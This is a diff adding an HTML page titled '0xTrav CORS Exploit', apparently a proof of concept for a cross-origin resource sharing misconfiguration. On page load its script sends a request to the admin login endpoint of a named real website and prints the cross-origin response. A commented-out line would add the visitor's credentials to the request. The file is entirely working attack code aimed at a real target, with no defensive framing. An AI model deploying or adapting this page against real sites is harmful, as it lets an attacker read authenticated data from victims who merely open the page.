@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>0xTrav CORS Exploit</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin-top: 50px;
+        }
+        #output {
+            margin-top: 20px;
+            color: #333;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <h1>0xTrav CORS Exploit Auto-Triggered</h1>
+    <div id="output">Running exploit...</div>
+
+    <script>
+        window.onload = function() {
+            var outputDiv = document.getElementById('output');
+            var req = new XMLHttpRequest();
+
+            // Debugging the preflight or endpoint issue
+            console.log("Sending request to the vulnerable endpoint...");
+
+            // Callback for when the request completes
+            req.onload = function() {
+                if (this.status === 200) { // Success
+                    alert('Exploit successful!');
+                    outputDiv.innerHTML = '<strong>Response (status ' + this.status + '):</strong><br>' + this.responseText;
+                } else {
+                    alert('Exploit failed with status: ' + this.status);
+                    outputDiv.innerHTML = '<strong>Error (status ' + this.status + '):</strong> Could not complete the request.';
+                }
+            };
+
+            // Handle network or request errors
+            req.onerror = function() {
+                alert('Request error.');
+                outputDiv.innerHTML = '<strong>Error:</strong> Network or server issue.';
+            };
+
+            // Open a GET request to the endpoint
+            req.open('GET', 'https://admin.ayoba.me/admin/auth/login', true);
+
+            // Try sending the request without credentials first
+            // req.withCredentials = true; // Uncomment this if credentials are required
+
+            // Send the request
+            req.send();
+        };
+    </script>
+</body>
+</html>
